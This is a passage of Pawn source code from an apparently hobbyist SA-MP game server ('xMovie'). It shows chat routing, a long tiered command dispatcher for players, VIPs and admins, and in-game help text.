		    } else if (player[playerid][chat] == 3) // group
		    {
			    pGroup = player[playerid][moviecrew];
			    if (pGroup < MAX_GROUPS-3)
			    {
					format(strings, sizeof(strings), "[G%d] %s: %s", pGroup, playername, text);
					format(ircstring, sizeof(ircstring), "02[%d] 05[G%d] %s: %s", playerid, pGroup, playername, text);
				} else {
			        if (player[playerid][playingcc] == 1)
			        {
						format(strings, sizeof(strings), "[RADIO] %s: %s", playername, text);
						format(ircstring, sizeof(ircstring), "02[%d] 05[RADIO] %s: %s", playerid, playername, text);
					} else {
						format(strings, sizeof(strings), "[TEAM] %s: %s", playername, text);
						format(ircstring, sizeof(ircstring), "02[%d] 05[TEAM] %s: %s", playerid, playername, text);
					}
				}

				for (new pID = 0; pID < MAX_PLAYERS; pID++)
				{
					if (IsPlayerConnected(pID))
					{
						if (player[pID][moviecrew] == pGroup)
				    	SendClientMessage(pID, COLOR_ORANGE, strings);
					    //SendPlayerMessageToPlayer(pID, playerid, strings);
					}
				}
				//SendMessageToCrew(player[playerid][moviecrew], strings); // see loop
				IRC_GroupSay(1, IRCOP_CHANNEL, ircstring);

				format(logstring, sizeof(logstring), "%s: %s", playername, text);
				printflog("CHAT-G", logstring);
		    }
			return 0;
		}
	}
	return 1;
}

public OnPlayerCommandText(playerid, cmdtext[])
{
	//printf("\r\n[DEBUG-STUNTA] OnPlayerCommandText(%d, %s)", playerid, cmdtext);

    /*new i,
        c;
    while ((c = cmdtext[i++])) if (c < 0x20 || c > 0x7E) return 0; // Check for illegal characters.
    // Your now safe native functions*/

    if (!IsPlayerSpawned(playerid))
	{
        dcmd(login,5,cmdtext); // for VIPs & admins
        dcmd(kill,4,cmdtext); // for bugged spawn
		dcmd(help,4,cmdtext); // for bugged spawn
		return SendErrorMessage(playerid, EMBED_WHITE, "* You need to spawn before the commands are available *");
	}

	if (player[playerid][blocked] == 1)
	return SendErrorMessage(playerid, EMBED_WHITE , "* Your commands have been blocked *");

    if (player[playerid][afk] > 0)
	{
        dcmd(afk,3,cmdtext);
        dcmd(back,4,cmdtext);
		return SendErrorMessage(playerid, EMBED_WHITE, "* Cannot use any other commands then /back and /afk while Away *");
	}

	if (IsPlayerAdminLevel(playerid, 3)) goto admincon;

	if (player[playerid][specdm] == 1)
	{
	    dcmd(specdm,6,cmdtext);
	    dcmd(exit,4,cmdtext);
		return SendErrorMessage(playerid, EMBED_WHITE, "* Cannot use any other commands while spectating a dm, use /specdm <dmid> to switch or /exit *");
	}

    if (player[playerid][Spectating] == 1)
    {
    	dcmd(spec,4,cmdtext);
    	dcmd(exit,4,cmdtext);
		return SendErrorMessage(playerid, EMBED_WHITE, "* Cannot use any other commands while spectating someone except /spec (off) or /exit *");
	}

    if (player[playerid][jailed] == 1)
	{
        dcmd(jaillist,8,cmdtext);
		return SendErrorMessage(playerid, EMBED_WHITE, "* Cannot use any other commands then /jaillist while jailed *");
	}

	if (player[playerid][playingdm] == 1 || player[playerid][playingderby] == 1 || player[playerid][playingrr] == 1 || player[playerid][playingcc] == 1 || player[playerid][playingnb] == 1 || player[playerid][playingwarzone] == 1)
	{
	    dcmd(exit,4,cmdtext);
	    dcmd(spin,4,cmdtext);
	    dcmd(fire,4,cmdtext);
		dcmd(report,6,cmdtext);
	    dcmd(l,1,cmdtext);
	    dcmd(ul,2,cmdtext);
	    dcmd(lock,4,cmdtext);
	    dcmd(unlock,6,cmdtext);
	    dcmd(handsup,7,cmdtext);
		return SendErrorMessage(playerid, EMBED_WHITE, "* Cannot use any other commands while playing a dm, derby, russian roulette or cop chase except /exit *");
	}

    admincon:

   	if (IsPlayerSpawned(playerid) && cmdtext[0])
	{
		GetPlayerName(playerid, playername, sizeof(playername));
	    if (strfind(cmdtext, "register", true) != -1|| strfind(cmdtext, "login", true) != -1 || strfind(cmdtext, "setpass", true) != -1)
	    {
			format(logstring, sizeof(logstring), "%s issues command /register|login|setpass <hidden>", playername);
	    } else {
			format(logstring, sizeof(logstring), "%s issues command %s", playername, cmdtext);
		}
		printflog("CMD", logstring);
	}

    dcmd(test,4,cmdtext);
    dcmd(help,4,cmdtext);
    dcmd(vip,3,cmdtext);
    dcmd(premium,7,cmdtext);
    dcmd(donate,6,cmdtext);
   	/*dcmd(gen,3,cmdtext);
    dcmd(veh,3,cmdtext);
    dcmd(misc,4,cmdtext);*/
    dcmd(actions,7,cmdtext);
	dcmd(radio,5,cmdtext);
	dcmd(radio2,6,cmdtext);
    dcmd(news,4,cmdtext);
	dcmd(pm,2,cmdtext);
	dcmd(r,1,cmdtext);
    dcmd(rules,5,cmdtext);
    dcmd(register,8,cmdtext);
    dcmd(login,5,cmdtext);
	dcmd(setpass,7,cmdtext);
	dcmd(setmail,7,cmdtext);
	dcmd(setemail,8,cmdtext);
    dcmd(clogin,6,cmdtext);
	dcmd(clogout,7,cmdtext);
 	dcmd(me,2,cmdtext);
  	dcmd(bu,2,cmdtext);
  	dcmd(bubble,6,cmdtext);
    dcmd(listeners,9,cmdtext);
    dcmd(listeners2,10,cmdtext);
    dcmd(vips,4,cmdtext);
	dcmd(admins,6,cmdtext);
    dcmd(players,7,cmdtext);
    dcmd(health,6,cmdtext);
    dcmd(armour,6,cmdtext);
    dcmd(armor,5,cmdtext);
    dcmd(fix,3,cmdtext);
    dcmd(spray,5,cmdtext);
	dcmd(fi,2,cmdtext);
	dcmd(fight,5,cmdtext);
	dcmd(spe,3,cmdtext);
	dcmd(special,7,cmdtext);
	dcmd(stop,4,cmdtext);
	dcmd(stopanim,8,cmdtext);
	dcmd(stopani,7,cmdtext);
	dcmd(handsup,7,cmdtext);
    dcmd(colour,6,cmdtext);
    dcmd(color,5,cmdtext);
    dcmd(remove,6,cmdtext);
    dcmd(f,1,cmdtext);
   	dcmd(uf,2,cmdtext);
    dcmd(flip,4,cmdtext);
    dcmd(kill,4,cmdtext);
    dcmd(l,1,cmdtext);
    dcmd(lock,4,cmdtext);
    dcmd(ul,2,cmdtext);
    dcmd(unlock,6,cmdtext);
    dcmd(gi,2,cmdtext);
    dcmd(getinfo,7,cmdtext);
    dcmd(spec,4,cmdtext);
	dcmd(jaillist,8,cmdtext);
	dcmd(rr,2,cmdtext);
	dcmd(spin,4,cmdtext);
	dcmd(fire,4,cmdtext);
	dcmd(derby,5,cmdtext);
	dcmd(derbylist,9,cmdtext);
  	dcmd(dm,2,cmdtext);
  	dcmd(specdm,6,cmdtext);
  	dcmd(copchase,8,cmdtext);
  	dcmd(nadeball,8,cmdtext);
  	dcmd(warzone,7,cmdtext);
	dcmd(warzonelist,11,cmdtext);
    dcmd(exit,4,cmdtext);
    dcmd(run,3,cmdtext);
    dcmd(walk,4,cmdtext);
	dcmd(skate,5,cmdtext);
	dcmd(swim,4,cmdtext);
	dcmd(god,3,cmdtext);
	dcmd(vgod,4,cmdtext);
	dcmd(g,1,cmdtext);
	dcmd(irc,3,cmdtext);
	dcmd(report,6,cmdtext);
	dcmd(ramps,5,cmdtext);
	dcmd(af,2,cmdtext);
	dcmd(antifall,8,cmdtext);
	dcmd(turngoto,8,cmdtext);
	dcmd(goto,4,cmdtext);
	dcmd(ostick,6,cmdtext);
	dcmd(osetstick,9,cmdtext);
	dcmd(oreplace,8,cmdtext);
	dcmd(ounstick,8,cmdtext);
	dcmd(osticks,7,cmdtext);
	dcmd(osticksoff,10,cmdtext);
	dcmd(ostickson,9,cmdtext);
	dcmd(postick,7,cmdtext);
	dcmd(posetstick,10,cmdtext);
	dcmd(poreplace,9,cmdtext);
	dcmd(pounstick,9,cmdtext);
	dcmd(posticks,8,cmdtext);
	dcmd(posticksoff,11,cmdtext);
	dcmd(postickson,10,cmdtext);
	dcmd(world,5,cmdtext);
	dcmd(numberplate,11,cmdtext);
	dcmd(teleports,9,cmdtext);
	dcmd(iteleports,10,cmdtext);
	dcmd(telelist,8,cmdtext);
	dcmd(tele,4,cmdtext);
	dcmd(citylist,8,cmdtext);
	dcmd(city,4,cmdtext);
	dcmd(parklot,7,cmdtext);
	dcmd(ship,4,cmdtext);
	dcmd(airport,7,cmdtext);
	dcmd(bridge,6,cmdtext);
	dcmd(train,5,cmdtext);
	dcmd(sea,3,cmdtext);
	dcmd(247,3,cmdtext);
	dcmd(air,3,cmdtext);
	dcmd(ammu,4,cmdtext);
	dcmd(burg,4,cmdtext);
	dcmd(per,3,cmdtext);
	dcmd(bus,3,cmdtext);
	dcmd(casino,6,cmdtext);
	dcmd(cloth,5,cmdtext);
	dcmd(club,4,cmdtext);
	dcmd(eat,3,cmdtext);
	dcmd(fast,4,cmdtext);
	dcmd(girl,4,cmdtext);
	dcmd(gov,3,cmdtext);
	dcmd(homie,5,cmdtext);
	dcmd(gym,3,cmdtext);
	dcmd(strip,5,cmdtext);
	dcmd(msc,3,cmdtext);
	dcmd(lib,3,cmdtext);
	dcmd(pol,3,cmdtext);
	dcmd(sch,3,cmdtext);
	dcmd(sta,3,cmdtext);
	dcmd(ls,2,cmdtext);
	dcmd(sf,2,cmdtext);
	dcmd(lv,2,cmdtext);
	dcmd(mc,2,cmdtext);
	dcmd(arch,4,cmdtext);
	dcmd(tune,4,cmdtext);
	dcmd(nos,3,cmdtext);
	dcmd(delnos,6,cmdtext);
	dcmd(eject,5,cmdtext);
	dcmd(carcolour,9,cmdtext);
	dcmd(carcolor,8,cmdtext);
	dcmd(setspawn,8,cmdtext);
	dcmd(spawn,5,cmdtext);
	dcmd(loadpos,7,cmdtext);
	dcmd(unset,5,cmdtext);
	dcmd(money,5,cmdtext);
	dcmd(piss,4,cmdtext);
	dcmd(chat,4,cmdtext);
	dcmd(group,5,cmdtext);
	dcmd(crew,4,cmdtext);
	dcmd(nameon,6,cmdtext);
	dcmd(nameoff,7,cmdtext);
	dcmd(jump,4,cmdtext);
	dcmd(sjump,5,cmdtext);
	dcmd(hjump,5,cmdtext);
	dcmd(afk,3,cmdtext);
	dcmd(back,4,cmdtext);
	dcmd(afklist,7,cmdtext);
	dcmd(fps,3,cmdtext);
	dcmd(drunk,5,cmdtext);
	dcmd(lsd,3,cmdtext);
	dcmd(vote,4,cmdtext);
	dcmd(skill,5,cmdtext);
    dcmd(ms,2,cmdtext);
    dcmd(movespeed,9,cmdtext);
	dcmd(ss,2,cmdtext);
    dcmd(setspeed,8,cmdtext);
    dcmd(sr,2,cmdtext);
    dcmd(setrotation,11,cmdtext);
    dcmd(ptele,5,cmdtext);
    dcmd(pteleports,10,cmdtext);
	dcmd(pms,3,cmdtext);
	dcmd(icons,5,cmdtext);
	dcmd(nofire,6,cmdtext);
	//dcmd(commissioner,12,cmdtext);
	//dcmd(papaxo,6,cmdtext);
	dcmd(panels,6,cmdtext);
	dcmd(doors,5,cmdtext);
	dcmd(lights,6,cmdtext);
	dcmd(tires,5,cmdtext);
	dcmd(wreck,5,cmdtext);
	dcmd(tow,3,cmdtext);
	dcmd(setveh,6,cmdtext);
	dcmd(setvehicle,10,cmdtext);
	dcmd(bind,4,cmdtext);
	dcmd(stealth,7,cmdtext);
	dcmd(minigames,9,cmdtext);

	// VIP cmds
	if (IsVIP(playerid))
	{
		dcmd(vhelp,5,cmdtext);
		dcmd(bring,5,cmdtext);
		dcmd(strew,5,cmdtext);
		dcmd(apc,3,cmdtext);
		dcmd(acc,3,cmdtext);
		dcmd(odrop,5,cmdtext);
		dcmd(count,5,cmdtext);
		dcmd(countdown,9,cmdtext);
		dcmd(removestick,11,cmdtext);
		dcmd(setskin,7,cmdtext);
   		dcmd(givemoney,9,cmdtext);
	    dcmd(setmoney,8,cmdtext);
	    dcmd(map,3,cmdtext);
	    dcmd(object,6,cmdtext);
    	dcmd(sc,2,cmdtext);
    	dcmd(sp,2,cmdtext);
    	dcmd(resetandromada,14,cmdtext);
    	dcmd(resetrr,7,cmdtext);
    	dcmd(resetderby,10,cmdtext);
    	dcmd(resetgroup,10,cmdtext);
    	dcmd(resetcc,7,cmdtext);
    	dcmd(resetnb,7,cmdtext);
    	dcmd(resetwz,7,cmdtext);
   		dcmd(aclear,6,cmdtext);
    	dcmd(saclear,7,cmdtext);
		dcmd(skipaclear,10,cmdtext);
		dcmd(papc,4,cmdtext);
		dcmd(pacc,4,cmdtext);
		dcmd(vlights,7,cmdtext);
		dcmd(pcolor,6,cmdtext);
		dcmd(pcolour,7,cmdtext);
	  	dcmd(bu2,3,cmdtext);
	  	dcmd(bubble2,7,cmdtext);
	  	dcmd(la,2,cmdtext);
	  	dcmd(label,5,cmdtext);
	  	dcmd(copystick,9,cmdtext);
	  	dcmd(setgreet,8,cmdtext);
	  	dcmd(rev,3,cmdtext);
	  	dcmd(reverse,7,cmdtext);
	}
	// VIP end
	// ADMIN cmds
	if (IsPlayerAdminLevel(playerid, 1)) // admin level 1 or higher
	{
	 	dcmd(ahelp,5,cmdtext);
		dcmd(settime,7,cmdtext);
		dcmd(setweather,10,cmdtext);
		dcmd(sett,4,cmdtext);
		dcmd(setw,4,cmdtext);
		dcmd(slap,4,cmdtext);
		dcmd(hide,4,cmdtext);
		dcmd(togglemsg,9,cmdtext);
	    dcmd(giveweapon,10,cmdtext);
   		dcmd(say,3,cmdtext);
   		dcmd(pannounce,9,cmdtext);
		dcmd(announce,8,cmdtext);
		dcmd(cannounce,9,cmdtext);
   		dcmd(warn,4,cmdtext);
		dcmd(gotoseat,8,cmdtext);
		dcmd(miniguns,8,cmdtext);
		dcmd(advert,6,cmdtext);
		dcmd(clear,5,cmdtext);
		dcmd(setcolours,10,cmdtext);
		dcmd(setcolors,9,cmdtext);
    }
  	if (IsPlayerAdminLevel(playerid, 2)) // admin level 2 or higher
	{
		dcmd(disarm,6,cmdtext);
  		dcmd(setworld,8,cmdtext);
	    dcmd(setinterior,11,cmdtext);
	    dcmd(forcespawn,10,cmdtext);
	    dcmd(forceclass,10,cmdtext);
	    dcmd(freeze,6,cmdtext);
		dcmd(unfreeze,8,cmdtext);
		dcmd(jail,4,cmdtext);
 		dcmd(unjail,6,cmdtext);
   		dcmd(mute,4,cmdtext);
	    dcmd(unmute,6,cmdtext);
	    dcmd(knife,5,cmdtext);
	    dcmd(unlockall,9,cmdtext);
    	dcmd(kick,4,cmdtext);
	}
	if (IsPlayerAdminLevel(playerid, 3)) // admin level 3 or higher
 	{
 	    dcmd(asay,4,cmdtext);
   		dcmd(sethealth,9,cmdtext);
   		dcmd(setarmour,9,cmdtext);
   		dcmd(setarmor,8,cmdtext);
	    dcmd(carhealth,9,cmdtext);
	    dcmd(setgod,6,cmdtext);
	    dcmd(settags,7,cmdtext);
	    dcmd(setgoto,7,cmdtext);
	    dcmd(setchat,7,cmdtext);
	    dcmd(joincrew,8,cmdtext);
	    dcmd(leavecrew,9,cmdtext);
	    dcmd(aeject,6,cmdtext);
	    dcmd(strike,6,cmdtext);
	    dcmd(cw,2,cmdtext);
	    dcmd(clearwarnings,13,cmdtext);
	    dcmd(akill,5,cmdtext);
	    dcmd(explode,7,cmdtext);
	    dcmd(bigbang,7,cmdtext);
	    dcmd(forcesay,8,cmdtext);
	    dcmd(forceirc,8,cmdtext);
   		dcmd(block,5,cmdtext);
 		dcmd(unblock,7,cmdtext);
	    dcmd(ban,3,cmdtext);
	    dcmd(info,4,cmdtext);
	    dcmd(ipmatch,7,cmdtext);
	    dcmd(hostmatch,9,cmdtext);
	    dcmd(namematch,9,cmdtext);
	    dcmd(namematch2,10,cmdtext);
	}
	if (IsPlayerAdminLevel(playerid, 4)) // admin level 4 or higher
	{
	    dcmd(setg,4,cmdtext);
	    dcmd(setgravity,10,cmdtext);
    	dcmd(setdrunk,8,cmdtext);
	    dcmd(bigbang2,8,cmdtext);
 		dcmd(pwn,3,cmdtext);
 		dcmd(unpwn,5,cmdtext);
 		dcmd(forcecmd,8,cmdtext);
 		dcmd(forceanim,9,cmdtext);
 		dcmd(forcesanim,10,cmdtext);
 		dcmd(forceseat,9,cmdtext);
 		dcmd(forcepostick,12,cmdtext);
 		dcmd(forcepostick2,13,cmdtext);
 		dcmd(gmx,3,cmdtext);
	    dcmd(poo,3,cmdtext);
	    dcmd(pill,4,cmdtext);
	    dcmd(setname,7,cmdtext);
	    dcmd(fsetname,8,cmdtext);
	    dcmd(motd,4,cmdtext);
	    dcmd(addtele,7,cmdtext);
	    dcmd(derbyhelp,9,cmdtext);
	    dcmd(addderby,8,cmdtext);
	    dcmd(setdveh,7,cmdtext);
	    dcmd(setdmode,8,cmdtext);
	    dcmd(setdheight,10,cmdtext);
	    dcmd(setdspawn,9,cmdtext);
	    dcmd(setdcenter,10,cmdtext);
	    dcmd(setdmap,7,cmdtext);
	    dcmd(deldspawn,9,cmdtext);
	    dcmd(setevents,9,cmdtext);
	    dcmd(lockevent,9,cmdtext);
	    dcmd(inviteevent,11,cmdtext);
	    dcmd(play,4,cmdtext);
	    dcmd(play2,5,cmdtext);
	    dcmd(play3,5,cmdtext);
 		dcmd(forcecmdb,9,cmdtext);
 		dcmd(forceanimb,10,cmdtext);
 		dcmd(forcesanimb,11,cmdtext);
	    dcmd(forcedeath,10,cmdtext);
	    dcmd(earthquake,10,cmdtext);
	    //dcmd(setwarzone,10,cmdtext);
	}
	if (IsPlayerAdminLevel(playerid, 5)) // admin level 5 + 6
	{
		dcmd(connect,7,cmdtext);
		dcmd(ann,3,cmdtext);
		dcmd(annstop,7,cmdtext);
	    dcmd(crx,3,cmdtext);
	    dcmd(deltele,7,cmdtext);
	    dcmd(delderby,8,cmdtext);
		dcmd(flash,5,cmdtext);
		dcmd(sgoto,5,cmdtext);
 		dcmd(setvip,6,cmdtext);
    	dcmd(removevip,9,cmdtext);
    	dcmd(setadmin,8,cmdtext);
    	dcmd(removeadmin,11,cmdtext);
    	dcmd(setlevel,8,cmdtext);
    	dcmd(mysql,5,cmdtext);
	}
	return SendErrorMessage(playerid, EMBED_WHITE, "You have tried a non-existing command, type /help to view a complete list of server commands.");
}

dcmd_test(playerid,params[])
{
	if (IsPlayerAdminLevel(playerid, 4))
	{
	    new idx,
			teststr[255];

		teststr = strtok(params,idx);
	    if (!strlen(teststr))
		return SendClientMessage(playerid, COLOR_GREEN, "[INFO]: /test blood(2)");

		if (!strcmp(teststr, "blood",true))
		{
		    if (idx)
		    TextDrawShowForPlayer(playerid, RRblood);
			return 1;
		}
		else if (!strcmp(teststr, "blood2",true))
		{
		    if (idx)
			TextDrawHideForPlayer(playerid, RRblood);
			return 1;
		}

	}
	SendServerMessage(playerid, EMBED_IVORY, "[SUCCESS]: You are still connected!");
	return 1;
}

dcmd_help(playerid,params[])
{
	if (!IsPlayerSpawned(playerid))
	{
		//SpawnPlayer(playerid);
		GetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]);
		SetPlayerPos(playerid, playerxyza[0], playerxyza[1], playerxyza[2]+5);
		return 1;
	}

	/*SendClientMessage(playerid, COLOR_BLACK, "____________________________________________________________");
	SendClientMessage(playerid, COLOR_SEAGREEN, "| /gen <1-4> for the GENERAL commands");
	SendClientMessage(playerid, COLOR_SEAGREEN, "| /veh <1-3> for the VEHICLE commands");
	SendClientMessage(playerid, COLOR_SEAGREEN, "| /misc <1-6> for MISCELLANEOUS commands");
	SendClientMessage(playerid, COLOR_ORANGE, "| /actions, /ahelp, /ahelp2 for animations");
	SendClientMessage(playerid, COLOR_MEDIUMAQUA, "| /teleports, /iteleports, /telelist");
	SendClientMessage(playerid, COLOR_AQUA, "| IRC Server: irc.gtanet.com Channel: "IRC_CHANNEL"");

	if (IsAdmin(playerid))
	SendClientMessage(playerid,COLOR_TOMATO, "* VIP & Admin commands: /vhelp <1-3>, /ahelp <1-5>");
	else if (IsVIP(playerid))
	SendClientMessage(playerid,COLOR_TOMATO, "* VIP commands: /vhelp <1-3>");

	SendClientMessage(playerid, COLOR_BLACK, "¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯¯");*/

	/*TextDrawSetString(pmsg[playerid], "~r~COMMANDS~n~~n~~y~General:___~w~/gen <1-4>~n~~y~Vehicle:____~w~/veh <1-3>~n~~y~Miscel.:____~w~/misc <1-6>~n~~y~Anims:_____~w~/actions, /ahelp, /ahelp2~n~~y~Teleports:_~w~/teleports, /iteleports,~n~____________/telelist~n~~n~~b~IRC: "IRC_CHANNEL" (irc.gtanet.com)");
	TextDrawShowForPlayer(playerid, pmsg[playerid]);
	player[playerid][PMSGtextdraw] = 1;*/

	if (player[playerid][PMSGtextdraw] == -1)
    {
   		TextDrawShowForPlayer(playerid, pmsg1[playerid]);
		TextDrawShowForPlayer(playerid, pmsg2[playerid]);
   		TextDrawShowForPlayer(playerid, pmsg3[playerid]);
		TextDrawShowForPlayer(playerid, pmsg4[playerid]);
		TextDrawShowForPlayer(playerid, pmsg5[playerid]);
	}

	new option[8];
	sscanf(params, "S(1)[8]", option);

    if (!strcmp(option, "1", true)) // empty - 1 standard menu value
	{
		if (player[playerid][PMSGtextdraw] != -1)
		{
			TextDrawHideForPlayer(playerid, pmsg1[playerid]);
			TextDrawHideForPlayer(playerid, pmsg2[playerid]);
			TextDrawHideForPlayer(playerid, pmsg3[playerid]);
			TextDrawHideForPlayer(playerid, pmsg4[playerid]);
			TextDrawHideForPlayer(playerid, pmsg5[playerid]);
			player[playerid][PMSGtextdraw] = -1;
			return 1;
		}

		SetHelpTD(playerid, 0);
    }
	else if (!strcmp(option, "P", true) || !strcmp(option, "Player", true)) SetHelpTD(playerid, TD_MODE_PLAY1);
    else if (!strcmp(option, "V", true) || !strcmp(option, "Vehicle", true)) SetHelpTD(playerid, TD_MODE_VEHI1);
    else if (!strcmp(option, "T", true) || !strcmp(option, "Teleport", true)) SetHelpTD(playerid, TD_MODE_TELE1);
    else if (!strcmp(option, "O", true) || !strcmp(option, "Object", true)) SetHelpTD(playerid, TD_MODE_OBJE1);
    else if (!strcmp(option, "M", true) || !strcmp(option, "Misc", true)) SetHelpTD(playerid, TD_MODE_MISC1);
    else if (!strcmp(option, "Premium", true) || !strcmp(option, "Vip", true) || !strcmp(option, "Donate", true))
	{
		if (IsVIP(playerid))
		{
			SetHelpTD(playerid, TD_MODE_PREM1);
		}else {
			TextDrawHideForPlayer(playerid, pmsg1[playerid]);
			TextDrawHideForPlayer(playerid, pmsg2[playerid]);
			TextDrawHideForPlayer(playerid, pmsg3[playerid]);
			TextDrawHideForPlayer(playerid, pmsg4[playerid]);
			TextDrawHideForPlayer(playerid, pmsg5[playerid]);
			player[playerid][PMSGtextdraw] = -1;
			
		    if (!player[playerid][DONATEtextdraw])
			{
				TextDrawShowForPlayer(playerid, donatetd1);
				TextDrawShowForPlayer(playerid, donatetd2);
				player[playerid][DONATEtextdraw] = 1;
		    } else {
				TextDrawHideForPlayer(playerid, donatetd1);
				TextDrawHideForPlayer(playerid, donatetd2);
				player[playerid][DONATEtextdraw] = 0;
			}
		}
	}
	else if (!strcmp(option, "Admin", true) && IsAdmin(playerid)) SetHelpTD(playerid, TD_MODE_ADMI1);
	return 1;
}

stock SetHelpTD(playerid, mode)
{
	/*
	Help intro
	Player 1-6
	Vehicle
	Teleport
	Object
	Misc
	Premium
	Admin
	*/

	switch(mode)
	{
	    case TD_MODE_INTRO:
		{
			if (IsAdmin(playerid))
			{
				TextDrawSetString(pmsg2[playerid], "\
				~r~Server Commands~n~~n~~y~\
				/HELP P~n~\
				/HELP V~n~\
				/HELP T~n~\
				/HELP O~n~\
				/HELP M~n~\
				/HELP PREMIUM~n~\
				/HELP ADMIN~n~\
				~n~\
				~n~\
				~g~xMovie 2012\
				");
				
				TextDrawSetString(pmsg3[playerid], "\
				~r~(~p~Admin~r~)~n~~n~~b~\
				Player commands~n~\
				Vehicle commands~n~\
				Teleport commands~n~\
				Object commands~n~\
				Miscellaneous commands\
				");
				
				TextDrawSetString(pmsg4[playerid], "\
				~b~Premium commands~n~\
				Admin commands~n~\
				~n~\
				~n~\
				~g~by MrPepino, spacemud and [FRAG]B\
				");
			} else if (IsVIP(playerid))
			{
				TextDrawSetString(pmsg2[playerid], "\
				~r~Server Commands~n~~n~~y~\
				/HELP P~n~\
				/HELP V~n~\
				/HELP T~n~\
				/HELP O~n~\
				/HELP M~n~\
				/HELP PREMIUM~n~\
				~n~\
				~n~\
				~n~\
				~g~xMovie 2012\
				");

				TextDrawSetString(pmsg3[playerid], "\
				~r~(~p~Premium~r~)~n~~n~~b~\
				Player commands~n~\
				Vehicle commands~n~\
				Teleport commands~n~\
				Object commands~n~\
				Miscellaneous commands\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~b~Premium commands~n~\
				~n~\
				~n~\
				~n~\
				~g~by MrPepino, spacemud and [FRAG]B\
				");
			} else {
				TextDrawSetString(pmsg2[playerid], "\
				~r~Server Commands~n~~n~~y~\
				/HELP P~n~\
				/HELP V~n~\
				/HELP T~n~\
				/HELP O~n~\
				/HELP M~n~\
				~n~\
				~n~\
				~n~\
				~n~\
				~g~xMovie 2012\
				");

				TextDrawSetString(pmsg3[playerid], "\
				~r~(~p~Player~r~)~n~~n~~b~\
				Player commands~n~\
				Vehicle commands~n~\
				Teleport commands~n~\
				Object commands~n~\
				Miscellaneous commands\
				");

				TextDrawSetString(pmsg4[playerid], "\
				~n~\
				~n~\
				~n~\
				~n~\
				~g~by MrPepino, spacemud and [FRAG]B\
				");
			}
		}
		case TD_MODE_PLAY1:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P1~n~~n~~y~\
			/RULES~n~\
			/REGISTER~n~\
			/LOGIN~n~\
			/SETPASS~n~\
			/VIPS~n~\
			/ADMINS~n~\
			/GOD~n~\
			/VGOD~n~\
			/REPORT~n~\
			/IRC\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			View the server rules~n~\
			Register an account on xmovie~n~\
			Login to your account~n~\
			Change your password~n~\
			List online vips\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~List online admins~n~\
			Enable godmode~n~\
			Enable godmode for visual damage~n~\
			Report rulebreakers to admins~n~\
			Send messages to IRC\
			");
		}
		case TD_MODE_PLAY2:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P2~n~~n~~y~\
			/PM~n~\
			/R~n~\
			/PMS~n~\
			/VIP~n~\
			/S (SKIN)~n~\
			/SSEL~n~\
			/KILL~n~\
			/WORLD~n~\
			/COLOUR~n~\
			/MONEY\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Send a private message to a player~n~\
			Quickly respond to last private message~n~\
			Block personal messages~n~\
			View benefits of a VIP account~n~\
			Set your own skin\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Scroll through available skins~n~\
			Goodbye, cruel world!~n~\
			Set your virtual world~n~\
			Set your player (blip) colour~n~\
			Set your own money [Rich in Seconds]\
			");
		}
		case TD_MODE_PLAY3:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P3~n~~n~~y~\
			/GROUP~n~\
			/FPS~n~\
			/FPSLIMIT~n~\
			/FI(GHT)~n~\
			/ICONS~n~\
			/EXIT~n~\
			/DM~n~\
			/SPECDM~n~\
			/DERBY~n~\
			/DERBYLIST\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Manage group chat options~n~\
			Shows your FPS~n~\
			Set your games FPS Limit~n~\
			Set your fight style~n~\
			Enable/disable map icons\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Leave a minigame in progress~n~\
			Start a deathmatch~n~\
			Observe a deathmatch in progress~n~\
			Start a derby~n~\
			View the list of derby arenas\
			");
		}
		case TD_MODE_PLAY4:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P4~n~~n~~y~\
			/RR~n~\
			/SPIN~n~\
			/FIRE~n~\
			/COPCHASE~n~\
			/NAMEON~n~\
			/NAMEOFF~n~\
			/JUMP~n~\
			/SJUMP~n~\
			/HJUMP~n~\
			/RADIO(2)\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Start a game of Russian Roulette~n~\
			Spin the cylinder in Russian Roullete~n~\
			Fires your weapon in Russian Roullete~n~\
			Start a cop chase in Russian Roullete~n~\
			Set nametags on\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Set nametags off~n~\
			Normal jump~n~\
			Super jump~n~\
			High jump~n~\
			Toggle the radio on and off\
			");
		}
		case TD_MODE_PLAY5:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P5~n~~n~~y~\
			/OSTICK~n~\
			/OSETSTICK~n~\
			/OREPLACE~n~\
			/OUNSTICK~n~\
			/OSTICKS~n~\
			/OSTICKSOFF/ON~n~\
			/POSTICK~n~\
			/POSETSTICK~n~\
			/POREPLACE~n~\
			/POUNSTICK\
			");

			TextDrawSetString(pmsg3[playerid], "\
			Description~n~~n~~b~\
			Stick an object to you or your vehicle~n~\
			Set the position of a sticky object~n~\
			Replace a sticky object with another~n~\
			Remove a sticky object~n~\
			Open selection mode for a sticky object\
			");

			TextDrawSetString(pmsg4[playerid], "\
			~b~Toggle sticky objects visibility~n~\
			Attach an object to yourself~n~\
			Set the position of an attached object~n~\
			Replace an attached object with another~n~\
			Remove an attached object\
			");
		}
		case TD_MODE_PLAY6:
		{
			TextDrawSetString(pmsg2[playerid], "\
			~r~Player Cmds ~p~P6~n~~n~~y~\
			/POSTICKS~N~\
			/POSTICKSOFF/ON~n~\
			/NOFIRE~n~\
			/PLAYERS~n~\
			/AHELP(2)~n~\
			/PISS~n~\
			/ACTIONS~n~\
			/HANDSUP~n~\
			/STOPANIM~n~\
			\
			");

